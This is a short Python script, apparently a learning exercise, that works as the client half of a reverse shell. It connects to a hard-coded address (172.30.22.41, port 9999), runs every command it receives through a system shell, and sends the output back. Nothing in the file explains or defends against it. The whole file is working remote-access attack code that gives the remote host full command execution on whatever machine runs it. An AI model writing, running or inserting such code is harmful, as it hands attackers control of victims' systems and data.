import os 
import socket 
import subprocess

s = socket.socket()
host = '172.30.22.41'
port = 9999
s.connect((host, port))

while True:
    data = s.recv(1024)
    #cd does not print anything to the terminal so we check to see if it is a cd command
    #after we check to see if it is a cd command we take everything after the first two charcter,'cd' by using 3:
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data)> 0:
        cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin= subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd() + '> ')))
        print(output_str)

#close connection
s.close